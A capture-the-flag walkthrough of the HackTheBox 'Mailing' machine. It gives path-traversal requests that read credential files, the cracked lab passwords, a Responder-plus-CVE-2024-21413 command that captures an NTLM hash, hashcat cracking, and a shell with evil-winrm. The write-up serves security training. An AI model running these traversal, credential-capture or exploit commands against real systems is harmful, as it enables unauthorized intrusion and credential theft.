
Windows machine ,
nmap: 
```
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: completed IDLE OK NAMESPACE QUOTA CHILDREN RIGHTS=texkA0001 ACL IMAP4 SORT CAPABILITY IMAP4rev1
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: completed IDLE OK NAMESPACE QUOTA CHILDREN RIGHTS=texkA0001 ACL IMAP4 SORT CAPABILITY IMAP4rev1
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

```

---

Enumerating The website:
--
Found a download link:
	in the parameter found this:
		`/download.php?file=instructions.pdf` ------> LFI (local file inclusion)


Exploiting the LFI:
	`/download.php?file=../../windows/system32/drivers/etc/hosts` shows reply in burp repeater. It confirms my LFI guess.

Further exploiting LFI to reveal details:
	`/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI` shows the directories , and reveals database passwords and admin passwords. 
	
	This is the hmailserver config:

```
[Directories]

ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```


Crack the admin hash, Using `hash-identifier` , I found it is an MD5 hash. Crack it online.
cracked : `homenetworkingadministrator`

It has something to do with windows mailing . Microsoft `outlook` comes to mind.
Google Outlook exploits and i found this :
 `https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file`

---
CVE POC exploit:

Start responder locally. 
`sudo responder -I tun0 -v`

Run the exploit:
`python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\<ip>' --subject XD` 
use the previously found admin password here.

And in your responder , we can see the NTLM hash of the user Maya.

After receiving the hash, use  hashcat with 5600 pattern to crack

`maya/m4y4ngs4ri`

use evilWinRM to get a shell

got user.

---

PRiv ESC :Root:
--
C has "important documents" folder and it has admin perm on it.

use this for root :
https://github.com/elweth-sec/CVE-2023-2255



